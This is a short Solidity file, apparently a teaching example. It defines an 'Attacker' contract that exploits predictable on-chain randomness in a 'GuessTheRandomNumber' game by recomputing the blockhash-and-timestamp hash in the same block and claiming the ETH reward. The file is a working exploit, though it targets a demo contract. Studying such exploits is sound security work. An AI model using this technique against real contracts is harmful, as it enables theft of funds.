// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./GuesssTheRandomNumber.sol";

contract Attacker {
    // that fallback is used to receive the ETH rewards from GuessTheRandomNumber contract
    receive() external payable {}

    // attack has a single input, which is the address of the GuessTheRandomNumber contract
    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        // whe it executes, the code from Attacker contract and from GuesssTheRandomNumber function contract,
        // both will be executed at the same block, so both will produce the same answer result
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
